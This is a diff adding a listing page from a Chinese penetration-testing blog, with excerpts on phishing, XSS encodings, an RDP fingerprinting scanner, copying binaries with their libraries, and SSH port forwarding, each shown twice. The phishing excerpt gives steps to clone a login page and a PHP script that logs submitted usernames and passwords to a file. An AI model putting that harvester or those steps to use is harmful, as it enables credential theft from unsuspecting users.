@@ -1,0 +1,851 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 12 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>😊#<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		wubba lubba dub dub.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/04/01/how-to-fish.html" >How To Fishing</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-04-01  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[XSS钓鱼模拟实战]<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
+</blockquote>
+<h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><pre class="line-numbers language-none"><code class="language-none">目标登录页面: login.html
+假的登录页面: fake.html
+世界上最好的语言: deal.php
+fish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h3 id="钓鱼步骤"><a href="#钓鱼步骤" class="headerlink" title="钓鱼步骤"></a>钓鱼步骤</h3><ul>
+<li>先下载目标login.html，保存为fake.html: <code>wget -r -p -np -k 网站地址</code></li>
+</ul>
+<p>然后替换掉登录时候的POST目标地址，比如<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>，替换掉自己的deal.php页面。</p>
+<p>注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html</p>
+<ul>
+<li>然后再服务器上构造一个deal.php</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$user &#x3D; $_POST[&#39;username&#39;];
+$pass &#x3D; $_POST[&#39;password&#39;];
+$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);
+fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);
+fclose($f);
+header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;跳转到正常的后台
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>还差一个js</li>
+</ul>
+	
+
+	</div>
+  <a type="button" href="/2017/04/01/how-to-fish.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<blockquote>
+<p>[XSS钓鱼模拟实战]<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
+</blockquote>
+<h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><pre class="line-numbers language-none"><code class="language-none">目标登录页面: login.html
+假的登录页面: fake.html
+世界上最好的语言: deal.php
+fish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<h3 id="钓鱼步骤"><a href="#钓鱼步骤" class="headerlink" title="钓鱼步骤"></a>钓鱼步骤</h3><ul>
+<li>先下载目标login.html，保存为fake.html: <code>wget -r -p -np -k 网站地址</code></li>
+</ul>
+<p>然后替换掉登录时候的POST目标地址，比如<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>，替换掉自己的deal.php页面。</p>
+<p>注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html</p>
+<ul>
+<li>然后再服务器上构造一个deal.php</li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">&lt;?php
+$user &#x3D; $_POST[&#39;username&#39;];
+$pass &#x3D; $_POST[&#39;password&#39;];
+$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);
+fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);
+fclose($f);
+header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;跳转到正常的后台
+?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>还差一个js</li>
+</ul>
+	
+	</div>
+  <a type="button" href="/2017/04/01/how-to-fish.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/03/09/copy-shared-lib.html" >Linux复制带动态库的命令</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-03-09  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>需求： 从一台Linux复制命令到另外一台上面，由于命令依赖动态库，比如gcc:</p>
+<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
+	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
+	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
+	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这种情况下单单复制gcc没卵用，google了下找到某个bash脚本:</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
+
+if [ $# !&#x3D; 2 ] ; then
+    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
+    exit 1
+fi
+
+PATH_TO_BINARY&#x3D;&quot;$1&quot;
+TARGET_FOLDER&#x3D;&quot;$2&quot;
+
+# if we cannot find the the binary we have to abort
+if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
+    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
+    exit 1
+fi
+
+# copy the binary to the target folder
+# create directories if required
+echo &quot;---&gt; copy binary itself&quot;
+cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;
+
+# copy the required shared libs to the target folder
+# create directories if required
+echo &quot;---&gt; copy libraries&quot;
+for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
+   if [ -f &quot;$lib&quot; ] ; then
+        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
+   fi  
+done
+
+# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
+# however, I&#39;ve not tested that yet
+# create lib64 - if required and link the content from lib to it
+if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
+    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
+fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用法: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
+</ul>
+
+	
+
+	</div>
+  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>需求： 从一台Linux复制命令到另外一台上面，由于命令依赖动态库，比如gcc:</p>
+<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
+	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
+	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
+	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>这种情况下单单复制gcc没卵用，google了下找到某个bash脚本:</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
+
+if [ $# !&#x3D; 2 ] ; then
+    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
+    exit 1
+fi
+
+PATH_TO_BINARY&#x3D;&quot;$1&quot;
+TARGET_FOLDER&#x3D;&quot;$2&quot;
+
+# if we cannot find the the binary we have to abort
+if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
+    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
+    exit 1
+fi
+
+# copy the binary to the target folder
+# create directories if required
+echo &quot;---&gt; copy binary itself&quot;
+cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;
+
+# copy the required shared libs to the target folder
+# create directories if required
+echo &quot;---&gt; copy libraries&quot;
+for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
+   if [ -f &quot;$lib&quot; ] ; then
+        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
+   fi  
+done
+
+# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
+# however, I&#39;ve not tested that yet
+# create lib64 - if required and link the content from lib to it
+if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
+    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
+fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>用法: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/03/02/xss-encode-decode.html" >xss基础编码</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-03-02  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p>
+<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
+1. HTML Decoding
+2. URL Decoding
+3. Javascript Decoding
+
+http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>三种编码，对于html来说是(10进制和16进制）</p>
+<h3 id="html尖括号"><a href="#html尖括号" class="headerlink" title="html尖括号"></a>html尖括号</h3><ul>
+<li>十进制：<code>&amp;#60;</code> </li>
+<li>html十六: <code>&amp;#x3c;</code></li>
+</ul>
+<h3 id="javascript的八进制和16进制以及unicode编码"><a href="#javascript的八进制和16进制以及unicode编码" class="headerlink" title="javascript的八进制和16进制以及unicode编码:"></a>javascript的八进制和16进制以及unicode编码:</h3><p>尖括号－－&gt; </p>
+<ul>
+<li>八进制:<code>\74</code> </li>
+<li>十六进制: <code>\x3c</code></li>
+<li>unicode编码: <code>\u003c</code></li>
+</ul>
+<h3 id="url编码及base64编码-lt"><a href="#url编码及base64编码-lt" class="headerlink" title="url编码及base64编码(&lt;)"></a>url编码及base64编码(&lt;)</h3><ul>
+<li>url: %3C </li>
+<li>base64: PA==</li>
+</ul>
+	
+
+	</div>
+  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>html的实体编码，比如十进制编码和十六进制编码，需要放在html标签里面。</p>
+<pre class="line-numbers language-none"><code class="language-none">Fun fact Decoding Order:
+1. HTML Decoding
+2. URL Decoding
+3. Javascript Decoding
+
+http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>三种编码，对于html来说是(10进制和16进制）</p>
+<h3 id="html尖括号"><a href="#html尖括号" class="headerlink" title="html尖括号"></a>html尖括号</h3><ul>
+<li>十进制：<code>&amp;#60;</code> </li>
+<li>html十六: <code>&amp;#x3c;</code></li>
+</ul>
+<h3 id="javascript的八进制和16进制以及unicode编码"><a href="#javascript的八进制和16进制以及unicode编码" class="headerlink" title="javascript的八进制和16进制以及unicode编码:"></a>javascript的八进制和16进制以及unicode编码:</h3><p>尖括号－－&gt; </p>
+<ul>
+<li>八进制:<code>\74</code> </li>
+<li>十六进制: <code>\x3c</code></li>
+<li>unicode编码: <code>\u003c</code></li>
+</ul>
+<h3 id="url编码及base64编码-lt"><a href="#url编码及base64编码-lt" class="headerlink" title="url编码及base64编码(&lt;)"></a>url编码及base64编码(&lt;)</h3><ul>
+<li>url: %3C </li>
+<li>base64: PA==</li>
+</ul>
+	
+	</div>
+  <a type="button" href="/2017/03/02/xss-encode-decode.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/02/28/3389-scan.html" >3389指纹扫描</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-02-28  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>nmap的扫描原理没怎么探索，只知道使用nmap扫描的时候，目标服务器扫不出来东西。特地分析了下3389远程链接的过程。简单来说是这样的：</p>
+<ul>
+<li>TCP三次握手</li>
+<li>客户端发送COTP协议</li>
+<li>服务端发送TPKT</li>
+</ul>
+<p>原来是用socket编程这么简单，只需要抓wireshark，把TCP的数据封装为16进制发送出去就行了。</p>
+<p>最后的python脚本是这样的：</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
+# coding: utf-8
+
+import socket
+import binascii
+import sys
+import threading
+from Queue import Queue
+
+
+def verify(sock, port):
+	while 1:
+		buff &#x3D; sock.recv(2048)
+		if not buff:
+			break
+		b &#x3D; bytearray(buff)
+		print &quot;[+] %s&quot; % binascii.hexlify(b)
+		detect_os(binascii.hexlify(b), port)
+		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
+		# 	print &quot;[+] RDP Port is %s&quot; % port
+		# 	sys.exit(0)
+
+
+def detect_os(res, port):
+	d &#x3D; &#123;
+		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
+		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
+		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
+		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
+		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
+		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
+	&#125;
+	for key, value in d.iteritems():
+		if value &#x3D;&#x3D; res:
+			print &quot;[+] Os May be: %s&quot; % key
+			print &quot;[+] RDP Port is %s&quot; % port
+			sys.exit(0)
+def send_payload(sock):
+	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)
+
+
+def worker():
+	while not q.empty():
+		port &#x3D; q.get()
+		try:
+			scan(port)
+		finally:
+			q.task_done()
+
+
+def scan(port):
+	try:
+		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.settimeout(2)
+		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
+		sys.stdout.flush()
+		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
+			print &quot;[+] Connect Success %s&quot; % port
+			send_payload(s)
+			verify(s, port)
+	except Exception, e:
+		# raise e
+		pass
+	s.close()
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+	if len(sys.argv) !&#x3D; 2:
+		print &quot;Usage: %s IP&quot; % sys.argv[0]
+		sys.exit(0)
+	ip &#x3D; sys.argv[1]
+	q &#x3D; Queue()
+	map(q.put, xrange(3300, 65535))
+	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
+	map(lambda x: x.start(), threads)
+	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+	
+
+	</div>
+  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>nmap的扫描原理没怎么探索，只知道使用nmap扫描的时候，目标服务器扫不出来东西。特地分析了下3389远程链接的过程。简单来说是这样的：</p>
+<ul>
+<li>TCP三次握手</li>
+<li>客户端发送COTP协议</li>
+<li>服务端发送TPKT</li>
+</ul>
+<p>原来是用socket编程这么简单，只需要抓wireshark，把TCP的数据封装为16进制发送出去就行了。</p>
+<p>最后的python脚本是这样的：</p>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;python
+# coding: utf-8
+
+import socket
+import binascii
+import sys
+import threading
+from Queue import Queue
+
+
+def verify(sock, port):
+	while 1:
+		buff &#x3D; sock.recv(2048)
+		if not buff:
+			break
+		b &#x3D; bytearray(buff)
+		print &quot;[+] %s&quot; % binascii.hexlify(b)
+		detect_os(binascii.hexlify(b), port)
+		# if len(binascii.hexlify(b)) &#x3D;&#x3D; 38:
+		# 	print &quot;[+] RDP Port is %s&quot; % port
+		# 	sys.exit(0)
+
+
+def detect_os(res, port):
+	d &#x3D; &#123;
+		&quot;2000&quot;: &quot;0300000b06d00000123400&quot;,
+		&quot;2003&quot;: &quot;030000130ed000001234000300080002000000&quot;,
+		&quot;2008&quot;: &quot;030000130ed000001234000200080002000000&quot;,
+		&quot;win7OR2008R2&quot;: &quot;030000130ed000001234000209080002000000&quot;,
+		&quot;2008R2DC&quot;: &quot;030000130ed000001234000201080002000000&quot;,
+		&quot;2012R2OR8&quot;: &quot;030000130ed00000123400020f080002000000&quot;
+	&#125;
+	for key, value in d.iteritems():
+		if value &#x3D;&#x3D; res:
+			print &quot;[+] Os May be: %s&quot; % key
+			print &quot;[+] RDP Port is %s&quot; % port
+			sys.exit(0)
+def send_payload(sock):
+	sock.send(&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00&quot;)
+
+
+def worker():
+	while not q.empty():
+		port &#x3D; q.get()
+		try:
+			scan(port)
+		finally:
+			q.task_done()
+
+
+def scan(port):
+	try:
+		s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.settimeout(2)
+		sys.stdout.write(&#39;[+] Check Port %s \r&#39; % port)
+		sys.stdout.flush()
+		if s.connect_ex((ip, port)) &#x3D;&#x3D; 0:
+			print &quot;[+] Connect Success %s&quot; % port
+			send_payload(s)
+			verify(s, port)
+	except Exception, e:
+		# raise e
+		pass
+	s.close()
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+	if len(sys.argv) !&#x3D; 2:
+		print &quot;Usage: %s IP&quot; % sys.argv[0]
+		sys.exit(0)
+	ip &#x3D; sys.argv[1]
+	q &#x3D; Queue()
+	map(q.put, xrange(3300, 65535))
+	threads &#x3D; [threading.Thread(target&#x3D;worker) for i in xrange(50)]
+	map(lambda x: x.start(), threads)
+	q.join()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+	
+	</div>
+  <a type="button" href="/2017/02/28/3389-scan.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/02/16/ssh-port-forward.html" >SSH端口转发</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-02-16  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>以下几个原则：</p>
+<ul>
+<li>SSH简单来说就是2台机器之间安全的数据通道，它包括ssh的client和ssh的server2个角色，这样的一条通道就是(ssh tunneling)</li>
+<li>SSH端口转发需要ssh连接，同时SSH连接有方向，从SSH Client到SSH Server</li>
+<li>同理应用请求也是有方向的，一般是客户端向服务端发出请求</li>
+<li>一旦这两个方向相同，称为SSH的本地转发(-L)，反之称为远端转发(-R）</li>
+</ul>
+<h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p><code>ssh -L &lt;local port&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;sshserver&gt;</code></p>
+<p>通过sshserver建立与host的连接，并将host的hostport绑定到本地的localport端口</p>
+<p>应用场景：比如有一台应用服务器appserver（appserver.com），要访问其80端口，但是本地却不能直接访问，于是可以借助一台可以访问appserver的sshserver（sshserver.com）来访问它。<br><code>ssh -L 8000:appserver.com:80  user@sshserver.com</code></p>
+<p>ssh链接建立之后，发送到本地8000的包会通过sshserver转发给appserver的80端口</p>
+<h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p><code>ssh -R &lt;remoteport&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;remoteserver&gt;</code><br>远程转发可以通过本地主机，将remoteserver与host连接，host的hostport<br>将会映射到remoteserver的remoteport端口</p>
+<p>应用场景: 一台应用服务器appserver(appserver.com），只有本地才能访问80端口，假如remoteserver想访问appserver的80端口，需要通过本地主机做隧道来完成。</p>
+	
+
+	</div>
+  <a type="button" href="/2017/02/16/ssh-port-forward.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>以下几个原则：</p>
+<ul>
+<li>SSH简单来说就是2台机器之间安全的数据通道，它包括ssh的client和ssh的server2个角色，这样的一条通道就是(ssh tunneling)</li>
+<li>SSH端口转发需要ssh连接，同时SSH连接有方向，从SSH Client到SSH Server</li>
+<li>同理应用请求也是有方向的，一般是客户端向服务端发出请求</li>
+<li>一旦这两个方向相同，称为SSH的本地转发(-L)，反之称为远端转发(-R）</li>
+</ul>
+<h3 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h3><p><code>ssh -L &lt;local port&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;sshserver&gt;</code></p>
+<p>通过sshserver建立与host的连接，并将host的hostport绑定到本地的localport端口</p>
+<p>应用场景：比如有一台应用服务器appserver（appserver.com），要访问其80端口，但是本地却不能直接访问，于是可以借助一台可以访问appserver的sshserver（sshserver.com）来访问它。<br><code>ssh -L 8000:appserver.com:80  user@sshserver.com</code></p>
+<p>ssh链接建立之后，发送到本地8000的包会通过sshserver转发给appserver的80端口</p>
+<h3 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h3><p><code>ssh -R &lt;remoteport&gt;:&lt;host&gt;:&lt;hostport&gt; &lt;remoteserver&gt;</code><br>远程转发可以通过本地主机，将remoteserver与host连接，host的hostport<br>将会映射到remoteserver的remoteport端口</p>
+<p>应用场景: 一台应用服务器appserver(appserver.com），只有本地才能访问80端口，假如remoteserver想访问appserver的80端口，需要通过本地主机做隧道来完成。</p>
+	
+	</div>
+  <a type="button" href="/2017/02/16/ssh-port-forward.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/11/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/page/13/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
+		
+			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+		
+			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
+		
+			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
+		
+			<li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+		
+			<li><a href="/categories/Python/">Python<span>5</span></a></li>
+		
